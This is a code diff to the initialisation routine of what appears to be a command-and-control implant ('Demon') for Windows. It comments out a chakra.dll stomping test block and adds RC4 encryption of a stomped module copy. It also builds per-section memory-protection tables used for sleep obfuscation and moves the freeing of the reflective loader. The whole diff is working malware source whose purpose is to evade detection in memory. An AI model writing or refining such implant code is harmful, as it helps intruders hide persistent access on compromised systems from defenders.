@@ -278,6 +278,7 @@ VOID DemonMetaData( PPACKAGE* MetaData, BOOL Header )
 VOID DemonInit( PVOID ModuleInst, PKAYN_ARGS KArgs )
 {
     OSVERSIONINFOEXW             OSVersionExW     = { 0 };
+    PBYTE                        ptr = NULL;
     PVOID                        RtModules[]      = {
             RtAdvapi32,
             RtMscoree,
@@ -499,38 +500,38 @@ VOID DemonInit( PVOID ModuleInst, PKAYN_ARGS KArgs )
     }
 
     //TODO: START. remove for testing
-    PVOID Module = Instance.Win32.LoadLibraryExW(L"chakra.dll",NULL,DONT_RESOLVE_DLL_REFERENCES);
-    PIMAGE_NT_HEADERS NtHeaders = C_PTR(Module + ((PIMAGE_DOS_HEADER) Module)->e_lfanew);
-    PIMAGE_SECTION_HEADER SecHeader = IMAGE_FIRST_SECTION(NtHeaders);
-    LPVOID KVirtualMemory = NULL;
-    SIZE_T SecMemorySize = 0;
-    SIZE_T StompedSize = 0;
-    for (DWORD i = 0; i < NtHeaders->FileHeader.NumberOfSections; i++) {
-        //SecMemory = C_PTR( ModuleStomped + SecHeader[ i ].VirtualAddress );
-        if (IsText(&SecHeader[i])) {
-            KVirtualMemory = C_PTR(Module + SecHeader[i].VirtualAddress);
-            SecMemorySize = SecHeader[i].SizeOfRawData;
-            StompedSize = SecMemorySize + KEYSIZE;
-            break;
-        }
-    }
-    PVOID StompedAddress = NULL;
-    SIZE_T tmp = StompedSize;
-    Instance.Win32.NtAllocateVirtualMemory(NtCurrentProcess(),&StompedAddress,0,&tmp,MEM_COMMIT,PAGE_READWRITE);
-    PBYTE DestPtr = (PBYTE)StompedAddress + KEYSIZE;
-    PBYTE SrcPtr = KVirtualMemory;
-    MemCopy(DestPtr,SrcPtr,StompedSize-KEYSIZE);
-    Instance.Session.Rc4StompedModule.Buffer = DestPtr;
-    Instance.Session.Rc4StompedModule.Length = StompedSize-KEYSIZE;
-    Instance.Session.Rc4StompedModule.MaximumLength = StompedSize-KEYSIZE;
-    Instance.Session.KeyStompedModule.Buffer = DestPtr - KEYSIZE;
-    Instance.Session.KeyStompedModule.Length = KEYSIZE;
-    Instance.Session.KeyStompedModule.MaximumLength = KEYSIZE;
-    PBYTE ptr = Instance.Session.KeyStompedModule.Buffer;
-    for(int i=0;i<KEYSIZE;i++){
-        ptr[i] = 0xa+i;
-    }
-    Instance.Win32.SystemFunction032(&(Instance.Session.Rc4StompedModule),&(Instance.Session.KeyStompedModule));
+//    PVOID Module = Instance.Win32.LoadLibraryExW(L"chakra.dll",NULL,DONT_RESOLVE_DLL_REFERENCES);
+//    PIMAGE_NT_HEADERS NtHeaders = C_PTR(Module + ((PIMAGE_DOS_HEADER) Module)->e_lfanew);
+//    PIMAGE_SECTION_HEADER SecHeader = IMAGE_FIRST_SECTION(NtHeaders);
+//    LPVOID KVirtualMemory = NULL;
+//    SIZE_T SecMemorySize = 0;
+//    SIZE_T StompedSize = 0;
+//    for (DWORD i = 0; i < NtHeaders->FileHeader.NumberOfSections; i++) {
+//        //SecMemory = C_PTR( ModuleStomped + SecHeader[ i ].VirtualAddress );
+//        if (IsText(&SecHeader[i])) {
+//            KVirtualMemory = C_PTR(Module + SecHeader[i].VirtualAddress);
+//            SecMemorySize = SecHeader[i].SizeOfRawData;
+//            StompedSize = SecMemorySize + KEYSIZE;
+//            break;
+//        }
+//    }
+//    PVOID StompedAddress = NULL;
+//    SIZE_T tmp = StompedSize;
+//    Instance.Win32.NtAllocateVirtualMemory(NtCurrentProcess(),&StompedAddress,0,&tmp,MEM_COMMIT,PAGE_READWRITE);
+//    PBYTE DestPtr = (PBYTE)StompedAddress + KEYSIZE;
+//    PBYTE SrcPtr = KVirtualMemory;
+//    MemCopy(DestPtr,SrcPtr,StompedSize-KEYSIZE);
+//    Instance.Session.Rc4StompedModule.Buffer = DestPtr;
+//    Instance.Session.Rc4StompedModule.Length = StompedSize-KEYSIZE;
+//    Instance.Session.Rc4StompedModule.MaximumLength = StompedSize-KEYSIZE;
+//    Instance.Session.KeyStompedModule.Buffer = DestPtr - KEYSIZE;
+//    Instance.Session.KeyStompedModule.Length = KEYSIZE;
+//    Instance.Session.KeyStompedModule.MaximumLength = KEYSIZE;
+//    PBYTE ptr = Instance.Session.KeyStompedModule.Buffer;
+//    for(int i=0;i<KEYSIZE;i++){
+//        ptr[i] = 0xa+i;
+//    }
+//    Instance.Win32.SystemFunction032(&(Instance.Session.Rc4StompedModule),&(Instance.Session.KeyStompedModule));
     //TODO: END. remove for testing
 
     if ( KArgs )
@@ -546,14 +547,16 @@ VOID DemonInit( PVOID ModuleInst, PKAYN_ARGS KArgs )
             Instance.Session.Rc4StompedModule.Length = KArgs->Rc4StompedModule.Length;
             Instance.Session.Rc4StompedModule.MaximumLength = KArgs->Rc4StompedModule.MaximumLength;
             Instance.Session.Rc4StompedModule.Buffer = KArgs->Rc4StompedModule.Buffer;
+
+            //Encrypt copy of stomped module. Shellcode just copy not encrypt
+            Instance.Win32.SystemFunction032(&(Instance.Session.Rc4StompedModule),&(Instance.Session.KeyStompedModule));
         }
+
 #if SHELLCODE
         Instance.Session.ModuleBase = KArgs->Demon;
         Instance.Session.ModuleSize = KArgs->DemonSize;
         Instance.Session.TxtBase = KArgs->TxtBase;
         Instance.Session.TxtSize = KArgs->TxtSize;
-        //FreeReflectiveLoader( KArgs->KaynLdr );
-
 #endif
     }
     else
@@ -569,6 +572,45 @@ VOID DemonInit( PVOID ModuleInst, PKAYN_ARGS KArgs )
         if ( Instance.Session.ModuleBase ) {
             Instance.Session.ModuleSize = IMAGE_SIZE( Instance.Session.ModuleBase );
         }
+    }
+    PIMAGE_NT_HEADERS NtHeaders = C_PTR( KArgs->DllCopy + ( ( PIMAGE_DOS_HEADER ) KArgs->DllCopy )->e_lfanew );
+    PIMAGE_SECTION_HEADER   SecHeader = IMAGE_FIRST_SECTION(NtHeaders);
+    SIZE_T KHdrSize  = SecHeader[ 0 ].VirtualAddress;
+    Instance.Session.NumberOfSections = NtHeaders->FileHeader.NumberOfSections;
+
+    Instance.Session.PageProtectParams = NtHeapAlloc(sizeof(PAGEPROTECT_PARAM)*Instance.Session.NumberOfSections);
+
+    for(int i=0;i<Instance.Session.NumberOfSections;i++){
+        Instance.Session.PageProtectParams[i].SecMemory = C_PTR(Instance.Session.ModuleBase + SecHeader[i].VirtualAddress - KHdrSize);
+        Instance.Session.PageProtectParams[i].SecMemorySize = SecHeader[i].SizeOfRawData;
+        Instance.Session.PageProtectParams[i].Protection = 0;
+        Instance.Session.PageProtectParams[i].OldProtection = 0;
+
+        if (SecHeader[i].Characteristics & IMAGE_SCN_MEM_WRITE)
+            Instance.Session.PageProtectParams[i].Protection = PAGE_WRITECOPY;
+
+        if (SecHeader[i].Characteristics & IMAGE_SCN_MEM_READ)
+            Instance.Session.PageProtectParams[i].Protection = PAGE_READONLY;
+
+        if ((SecHeader[i].Characteristics & IMAGE_SCN_MEM_WRITE) &&
+            (SecHeader[i].Characteristics & IMAGE_SCN_MEM_READ))
+            Instance.Session.PageProtectParams[i].Protection = PAGE_READWRITE;
+
+        if (SecHeader[i].Characteristics & IMAGE_SCN_MEM_EXECUTE)
+            Instance.Session.PageProtectParams[i].Protection = PAGE_EXECUTE;
+
+        if ((SecHeader[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) &&
+            (SecHeader[i].Characteristics & IMAGE_SCN_MEM_WRITE))
+            Instance.Session.PageProtectParams[i].Protection = PAGE_EXECUTE_WRITECOPY;
+
+        if ((SecHeader[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) &&
+            (SecHeader[i].Characteristics & IMAGE_SCN_MEM_READ)) {
+            Instance.Session.PageProtectParams[i].Protection = PAGE_EXECUTE_READ;
+        }
+        if ((SecHeader[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) &&
+            (SecHeader[i].Characteristics & IMAGE_SCN_MEM_WRITE) &&
+            (SecHeader[i].Characteristics & IMAGE_SCN_MEM_READ))
+            Instance.Session.PageProtectParams[i].Protection = PAGE_EXECUTE_READWRITE;
     }
     if(Instance.Session.Rc4StompedModule.Buffer != NULL) {
         //creating encrypted copy of payload later useful during sleep obf for module stomping
@@ -590,6 +632,11 @@ VOID DemonInit( PVOID ModuleInst, PKAYN_ARGS KArgs )
     } else {
         Instance.Session.OS_Arch  = PROCESSOR_ARCHITECTURE_INTEL;
     }
+#endif
+
+#if SHELLCODE
+    FreeReflectiveLoader( KArgs->KaynLdr );
+
 #endif
 
     Instance.Session.PID       = U_PTR( Instance.Teb->ClientId.UniqueProcess );
